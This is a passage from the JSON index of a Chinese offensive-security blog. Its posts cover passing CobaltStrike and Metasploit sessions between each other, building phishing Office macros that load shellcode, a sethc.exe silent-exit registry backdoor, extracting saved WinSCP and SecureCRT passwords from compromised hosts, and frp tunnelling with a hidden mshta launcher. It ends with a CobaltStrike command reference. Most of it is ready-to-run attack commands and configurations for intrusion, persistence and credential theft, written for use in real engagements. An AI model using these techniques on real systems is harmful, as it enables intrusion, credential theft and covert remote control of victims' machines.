最终，只要密码一致、 能出网，且未被杀软阻止的均会成功上线。 CS与MSF会话互传CobaltStrike派生Metasploit当CobaltStrike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令： 12345msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload windows/meterpreter/reverse_tcp #不要用x64的payloadmsf5 &gt; set lhost 10.11.42.99msf5 &gt; set lport 5353msf5 &gt; run -j 之后使用CobaltStrike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。 然后选中计算机，右键-&gt;Spawn：选择MSF的监听器： 这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。 Metasploit派生CobaltStrike现在已经获得了一个meterpreter的session，把session传给CobaltStrike。 在CobaltStrike中创建一个监听者，和上一步类似，这里host需要修改为CobaltStrike客户端IP，创建好之后便监听8099端口，等待着被控机连接。 \u0001接下来，把meterpreter获得的session转交给CobaltStrike，在Metasploit执行以下命令： 12345678meterpreter &gt; background msf5 &gt; use exploit/windows/local/payload_inject msf5 &gt; set payload windows/meterpreter/reverse_httpmsf5 &gt; set lhost 192.168.144.174msf5 &gt; set lport 8099msf5 &gt; set DisablePayloadHandler true msf5 &gt; set session 1msf5 &gt; run 解释一下这些参数。由于CobaltStrike的监听器我们使用的是： windows/beacon_http/reverse_http 所以我们的payload也要使用： payload windows/meterpreter/reverse_http 设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要设置成CobaltStrike机器的IP与端口。 默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置： set DisablePayloadHandler true 设置当前的session，执行run。 此时目标机便已成功从CobaltStrike上线。 总结关于CobalStrike与Metasploit 的联动利用方式远不止这些，每种方式在实战中都有对应的应用场景，更需要探索与总结。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Office宏的基本利用","slug":"Office宏的基本利用","date":"2019-12-09T06:35:09.000Z","updated":"2021-01-27T05:26:49.762Z","comments":true,"path":"2019/1209/basic-use-of-office-macros.html","link":"","permalink":"https://payloads.cn/2019/1209/basic-use-of-office-macros.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。 Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本。 环境准备 Windows 7 x64 旗舰版 Microsoft Office 2016 CobaltStrike 3.14 CobaltStrike生成宏先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可。 创建宏Word打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定” 。 编写主体内容后，点击 “开发工具 — Visual Basic” 。 双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器 。 另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码。 反弹Beacon shell默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。 诱导目标手动点击”启用内容”宏。 目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell。 宏代码分析CobaltStrike生成默认的VBA会导入四个Windows API函数，常见的ShellCode加载器代码： CreateRemoteThread 创建一个在其它进程地址空间中运行的线程(也称:创建远程线程). VirtualAllocEx 指定进程的虚拟空间保留或提交内存区域 WriteProcessMemory 写入某一进程的内存区域 CreateProcess 创建一个新的进程和它的主线程，这个新进程运行指定的可执行文件 其中Array(-4,-24,-119,0,0,0,96,-119,-27...就是ShellCode，混淆的办法有很多种。 ShellCode可以自己在VBA里解码或者比如每个元素自增1，运行的时候-1，达到免杀 ……","categories":[{"name":"钓鱼","slug":"钓鱼","permalink":"https://payloads.cn/categories/%E9%92%93%E9%B1%BC/"}],"tags":[{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"}]},{"title":"Shfit映像劫持后门新玩法","slug":"Shfit映像劫持后门新玩法","date":"2019-12-05T05:08:11.000Z","updated":"2021-01-27T05:27:12.690Z","comments":true,"path":"2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","link":"","permalink":"https://payloads.cn/2019/1205/shfit-image-hijacks-backdoor-new-gameplay.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 映像劫持简介映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。 映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。 简单测试映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\\windows\\system32\\cmd.exe 之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。 映像劫持后门新玩法实现效果键入五下Shift执行时，先执行sethc.exe程序，当sethc.exe程序静默退出时，执行CobaltStrike的Powershell，反弹Beacon shell 。 简单来说就是：程序A静默退出结束后，会执行程序B。 GFlages测试文章地址： https://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/ 下载gflags.exe https://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10) 根据微软的官方文档描述，在Silent Process Exit选项卡中的配置，都保存在注册表中。 GFlags工具自动添加并修改了“IFEO”目录下sethc.exe的GlobalFlag值。 以及SilentProcessExit下ReportingMode和MonitorProcess两个值。 这时测试会发现，当键入五下Shift时，先执行sethc.exe程序，当sethc.exe程序静默退出时，便会执行cmd.exe程序。 这么一来，可以直接在命令行中对注册表进行设置。（需要管理员权限） 1234reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v ReportingMode /t REG_DWORD /d 1 /freg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;c:\\windows\\system32\\cmd.exe&quot; /f 简单解释一下ReportingMode和MonitorProcess 这两个项值的作用。MonitorProcess的值表示监视器进程。Reporting Mode可以设置为三个值 。 Flag Value 解释 LAUNCH_MONITORPROCESS 0x1 检测到进程静默退出时，将会启动监视器进程（在GFLAGS.exe中，Silent Process Exit这个选项卡所填写的值，即MonitorProcess的项值） LOCAL_DUMP 0x2 检测到进程静默退出时，将会为受监视的进程创建转储文件 NOTIFICATION 0x4 检查到进程静默退出时，将会弹出一个通知 与CobaltStrike结合利用换位思考，用上述的方法，修改MonitorProcess值放入CobaltStrike的powershell。这样，可以在渗透中做到权限的维持，按五下Shift就可以隐蔽进行反连。 实测，Windows锁屏，键入五下Shift后正常弹粘滞键，关闭之后执行powershell代码，反弹beacon的shell。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"Windows后门","slug":"Windows后门","permalink":"https://payloads.cn/tags/Windows%E5%90%8E%E9%97%A8/"}]},{"title":"解密Winscp客户端中保存的密码hash","slug":"解密Winscp客户端中保存的密码hash","date":"2019-12-04T14:08:50.000Z","updated":"2021-01-27T05:23:09.908Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-saved-in-winscp-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-saved-in-winscp-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言WinSCP是一个Windows环境下使用的SSH的开源图形化SFTP客户端。同时支持SCP协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。而我们的主要目的是为了读取里面各种的SSH连接密码。 所有操作全部在管理员权限下进行 最新版Winscp为例通过powershell脚本搞定，或者RDP直接登录连接查询等。 「绿色版无安装记录」 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list 前提，目标得事先保存连接密码。 确定Winscp存储位置默认情况下，Winscp配置会存储在Windows对应的注册表项下（包括了连接的IP、用户名、密码Hash）。 HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\ 具体解密过程 查看Winscp配置的Windows注册表（注册表项是固定的），如果有连接会话，再指定查询连接下所保存的密码Hash。 12beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot; 将查到的信息拷贝到本地的winscppwd.exe进行解密。 RDP直接登录目标，导出Winscp配置文件，并下载到本地进行解密。(如果找到配置的ini文件，直接把对应文件down本地进行解密即可) 附脚本工具 ListInstalledPrograms.ps1 winscppwd.exe","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"解密SecureCRT客户端中保存的密码hash","slug":"解密SecureCRT客户端中保存的密码hash","date":"2019-12-04T14:08:30.000Z","updated":"2021-01-27T05:22:39.729Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。 所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用文章末的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了。 确定目标SecureCRT的详细版本想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）。 12beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps1beacon&gt; powershell Get-list 确定SecureCRT配置文件目录下的Sessions目录默认情况下，SecureCRT的Config目录路径为：%APPDATA%\\VanDyke\\Config\\Sessions\\ 如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认。 Sessions目录下的每个ini文件都会以连接的IP或域名来命名。 1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\ 拷贝下载Sessions目录的ini文件直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。 1234beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps1beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini beacon&gt; download c:\\windows\\temp\\192.168.144.128.ini 脚本解密Session将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！ 1sudo pip2 install pycrypto 1python SecureCRT-decryptpass.py 192.168.144.128.ini SecureCRT高版本解决如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\\VanDyke\\Config\\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。 目标SecureCRT版本与本地版本需一致，否则可能会出现问题。 附脚本 ListInstalledPrograms.ps1 Invoke-NinjaCopy.ps1 SecureCRT-decryptpass.py","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frp内网穿透实战","slug":"Frp内网穿透实战","date":"2019-12-04T14:07:28.000Z","updated":"2021-01-27T05:26:21.196Z","comments":true,"path":"2019/1204/frp-intranet-penetration-actual-combat.html","link":"","permalink":"https://payloads.cn/2019/1204/frp-intranet-penetration-actual-combat.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言实战中，当通过某种方式拿下目标机器权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。 更多详细使用方法，可查看官方Github，这里不再赘述。 https://github.com/fatedier/frp/ 前期准备先准备一台VPS与域名。 因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。 下载地址Frp下载地址 [跨平台，实战中根据目标机版本选择下载] https://github.com/fatedier/frp/releases 配置文件服务端12345678910111213141516171819202122232425262728293031323334353637383940#通用配置段[common]#frp服务端监听 [VPS]bind_addr = 0.0.0.0#frp服务器监听端口 [实战中可以用一些通透性较好的端口]bind_port = 7007#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]dashboard_port = 6609#服务端Web控制面板用户名与密码 [强口令]dashboard_user = SuperMandashboard_pwd = WC3pvjmh2tt8#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中log_file = ./frps.log#日志记录等级，有trace、debug、info、warn、error,通常情况下为infolog_level = info #日志保留时间log_max_days = 3#验证凭据，服务端和客户端的凭据必须一样才能连接auth_token = E0iQEBOdoJeh#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端] privilege_mode = true#特权模式Token [强口令，建议随机生成]privilege_token = kukezkHC8R1H#特权模式允许分配的端口 [避免端口被滥用] privilege_allow_ports = 4000-50000#心跳检测超时时长 heartbeat_timeout = 30#每个代理可以设置的连接池上限max_pool_count = 20#口令认证超时时间，一般不用改authentication_timeout = 900#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析] subdomain_host = xxxx.online 客户端1234567891011121314151617181920212223242526272829303132333435#通用配置段[common]#frp服务端IP或域名 [实战中一般都会直接用域名] server_addr = frp.xxxx.online#frp服务器端口server_port = 7007#授权token，此处必须与服务端保持一致，否则无法建立连接 auth_token = E0iQEBOdoJeh#启用特权模式 [特权模式下服务端无需配置] privilege_mode = true#特权模式 token,同样要与服务端完全保持一致 privilege_token = kukezkHC8R1H#心跳检查间隔与超时时间heartbeat_interval = 10 heartbeat_timeout = 30#连接数量 pool_count = 20#内网穿透通常用socks5[socks5]type = tcp#连接VPS内网穿透的远程连接端口remote_port = 9066#使用插件socks5代理plugin = socks5#启用加密 [通信内容加密传输，有效防止流量被拦截]use_encryption = true#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]use_compression = true#socks5连接口令 [根据实际情况进行配置]#plugin_user = SuperMan#plugin_passwd = ZBO0McQe6mE1 执行部署服务端SSH连接到VPS上，后台启动frp服务端。 1234root@Ubuntu:~# cd tools/frp/root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;root@Ubuntu:~/tools/frp# jobs -lroot@Ubuntu:~/tools/frp# cat frps.log 客户端将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。 当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到。 但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序。 123beacon&gt; sleep 10beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.inibeacon&gt; shell netstat -ano |findstr 7007 或者，创建后台运行的bat脚本。 12345@echo off if &quot;%1&quot; == &quot;h&quot; goto begin mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit :begin c:\\frpc.exe -c c:\\frpc.ini 工具穿透Metasploit当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。 [若socks5设置口令，可结合proxychains] 123456# sudo msfconsole -qmsf5 &gt; setg proxies socks5:frp.xxxx.online:9066msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 10msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.178msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run WindowsWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。 小结Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike基本功能与使用","slug":"CobaltStrike基本功能与使用","date":"2019-12-04T10:47:29.000Z","updated":"2021-01-27T05:24:30.180Z","comments":true,"path":"2019/1204/basic-functions-and-usage-of-cobaltstrike.html","link":"","permalink":"https://payloads.cn/2019/1204/basic-functions-and-usage-of-cobaltstrike.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。 钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等。 Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。 Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。 基本功能安装Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。 服务端服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行： 123chmod +x teamserver./teamserver 10.11.42.202 test123 # 服务端真实IP(不能使用0.0.0.0或127.0.0.1)和连接密码 客户端客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。 在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。 参数详情Cobalt Strike 1234567New Connection #新的连接(支持连接多个服务器端)Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)Visualization #窗口视图模式(展示输出结果的形式)VPN Interfaces #VPN接入Listenrs #监听器(创建Listener)Script Manager #脚本管理Close #关闭 View 12345678910Applications #应用(显示受害者机器的应用信息)Credentials #凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)Downloads #下载文件Event Log #事件日志(主机上线记录以及团队协作聊天记录)Keystrokes #键盘记录Proxy Pivots #代理模块Screenshots #截图Script Console #脚本控制台(可以加载各种脚本，增强功能https://github.com/rsmudge/cortana-scripts)Targets #显示目标主机Web Log #Web日志 AttacksPackages 1234567HTML Application #生成恶意的HTA木马文件MS Office Macro #生成office宏病毒文件Payload Generator #生成各种语言版本的payloadUSB/CD AutoPlay #生成利用自动播放运行的木马文件Windows Dropper #捆绑器，能够对文档类进行捆绑Windows Executable #生成可执行PayloadWindows Executable(S) #把包含payload,Stageless生成可执行文件(包含多数功能) Web Drive-by 1234567Manage #对开启的web服务进行管理Clone Site #克隆网站(可记录受害者提交的数据)Host File #提供Web以供下载某文件Scripted Web Delivery #提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery Signed Applet Attack #启动一个Web服务以提供自签名Java Applet的运行环境Smart Applet Attack #自动检测Java版本并利用已知的exploits绕过securitySystem Profiler #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等 Reporting 123456780. Activity report #活动报告1. Hosts report #主机报告2. Indicators of Compromise #威胁报告3. Sessions report #会话报告4. Social engineering report #社会工程学报告5. Tactics, Techniques, and Procedures #策略、技巧和程序 Reset Data #重置数据Export Data #导出数据 Help 12345Homepage #官方主页Support #技术支持Arsenal #开发者System information #版本信息About #关于 右键菜单 Access123456Dump Hashes #获取hashElevate #提权Golden Ticket #生成黄金票据注入当前会话Make token #凭证转换Run Mimikatz #运行 Mimikatz Spawn As #用其他用户生成Cobalt Strike侦听器 Explore1234567Browser Pivot #劫持目标浏览器进程Desktop(VNC) #桌面交互File Browser #文件浏览器Net View #命令Net ViewPort Scan #端口扫描Process List #进程列表Screenshot #截图 Pivoting123SOCKS Server #代理服务Listener #反向端口转发Deploy VPN #部署VPN Spawn外部监听器(如指派给MSF，获取meterpreter权限) Session1234Note #备注Remove #删除Sleep #指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。Exit #退出 Interact(打开beacon)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495beacon&gt; helpBeacon Commands===============Command Description------- -----------argue 进程参数欺骗blockdlls 阻止子进程加载非Microsoft DLLbrowserpivot 注入受害者浏览器进程bypassuac 绕过UAC提升权限cancel 取消正在进行的下载cd 切换目录checkin 强制让被控端回连一次clear 清除beacon内部的任务队列connect Connect to a Beacon peer over TCPcovertvpn 部署Covert VPN客户端cp 复制文件dcsync 从DC中提取密码哈希desktop 远程桌面(VNC)dllinject 反射DLL注入进程dllload 使用LoadLibrary将DLL加载到进程中download 下载文件downloads 列出正在进行的文件下载drives 列出目标盘符elevate 使用expexecute 在目标上执行程序(无输出)execute-assembly 在目标上内存中执行本地.NET程序exit 终止beacon会话getprivs Enable system privileges on current tokengetsystem 尝试获取SYSTEM权限getuid 获取用户IDhashdump 转储密码哈希值help 帮助inject 在注入进程生成会话jobkill 结束一个后台任务jobs 列出后台任务kerberos_ccache_use 从ccache文件中导入票据应用于此会话kerberos_ticket_purge 清除当前会话的票据kerberos_ticket_use Apply 从ticket文件中导入票据应用于此会话keylogger 键盘记录kill 结束进程link Connect to a Beacon peer over a named pipelogonpasswords 使用mimikatz转储凭据和哈希值ls 列出文件make_token 创建令牌以传递凭据mimikatz 运行mimikatzmkdir 创建一个目录mode dns 使用DNS A作为通信通道(仅限DNS beacon)mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)mode http 使用HTTP作为通信通道mv 移动文件net net命令note 备注 portscan 进行端口扫描powerpick 通过Unmanaged PowerShell执行命令powershell 通过powershell.exe执行命令powershell-import 导入powershell脚本ppid Set parent PID for spawned post-ex jobsps 显示进程列表psexec Use a service to spawn a session on a hostpsexec_psh Use PowerShell to spawn a session on a hostpsinject 在特定进程中执行PowerShell命令pth 使用Mimikatz进行传递哈希pwd 当前目录位置reg Query the registryrev2self 恢复原始令牌rm 删除文件或文件夹rportfwd 端口转发run 在目标上执行程序(返回输出)runas 以其他用户权限执行程序runasadmin 在高权限下执行程序runu Execute a program under another PIDscreenshot 屏幕截图setenv 设置环境变量shell 执行cmd命令shinject 将shellcode注入进程shspawn 启动一个进程并将shellcode注入其中sleep 设置睡眠延迟时间socks 启动SOCKS4代理socks stop 停止SOCKS4spawn Spawn a session spawnas Spawn a session as another userspawnto Set executable to spawn processes intospawnu Spawn a session under another PIDssh 使用ssh连接远程主机ssh-key 使用密钥连接远程主机steal_token 从进程中窃取令牌timestomp 将一个文件的时间戳应用到另一个文件unlink Disconnect from parent Beaconupload 上传文件wdigest 使用mimikatz转储明文凭据winrm 使用WinRM横向渗透wmi 使用WMI横向渗透 使用Listeners简介在本版本Cobalt Strike 3.14中，提供了如图9种 Listener (监听器)。 123456789windows&#x2F;beacon_dns&#x2F;reverse_dns_txtwindows&#x2F;beacon_dns&#x2F;reverse_httpwindows&#x2F;beacon_http&#x2F;reverse_httpwindows&#x2F;beacon_https&#x2F;reverse_httpswindows&#x2F;beacon_smb&#x2F;bind_pipewindows&#x2F;beacon_tcp&#x2F;bind_tcpwindows&#x2F;foreign&#x2F;reverse_httpwindows&#x2F;foreign&#x2F;reverse_httpswindows&#x2F;foreign&#x2F;reverse_tcp (3.13版后增加，支持linuxSSH会话) beacon_xx 系列为Cobalt Strike自身，包括 dns、http、https、smb 四种方式的监听器。 foreign 系列为外部监听器，通常与MSF或者Armitage联动。 在Cobalt Strike 3.13版本后增加了一个新的 Listeners (windows/beacon_tcp/bind_tcp) ，它支持linuxSSH会话。具体更新内容可以查阅 官网 。 创建一个服务首先配置一个监听器 选择 Attacks &gt; Packages &gt; Windows Executable 上线成功，在 Event Log 处出现上线信息。 Beacon右键目标interact来使用Beacon，用它来执行各种命令。在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显，在这里设置sleep 10。 同时在beacon中，如果想对目标进行命令管理，需要在前面加上shell，如shell whoami、shell ipconfig等。 总结这里只是简单描述CobaltStrike的用法，其中还有很多功能的使用，需要实际操作中去发现。更核心的地方在于理解CobaltStrike的Beacon在内网中的通信过程，这对于渗透者能否更进一步深入内网起到重要作用，也是神器的价值所在。 在渗透过程中，不要仅限于单一模式的思路，根据实际的情况，选择更优的方法来进行下一步的渗透测试。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]}],"categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"},{"name":"SSH隧道","slug":"SSH隧道","permalink":"https://payloads.cn/categories/SSH%E9%9A%A7%E9%81%93/"},{"name":"总结","slug":"总结","permalink":"https://payloads.cn/categories/%E6%80%BB%E7%BB%93/"},{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"},{"name":"钓鱼","slug":"钓鱼","permalink":"https://payloads.cn/categories/%E9%92%93%E9%B1%BC/"},{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"},{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"},{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"},{"name":"Windows后门","slug":"Windows后门","permalink":"https://payloads.cn/tags/Windows%E5%90%8E%E9%97%A8/"},{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]}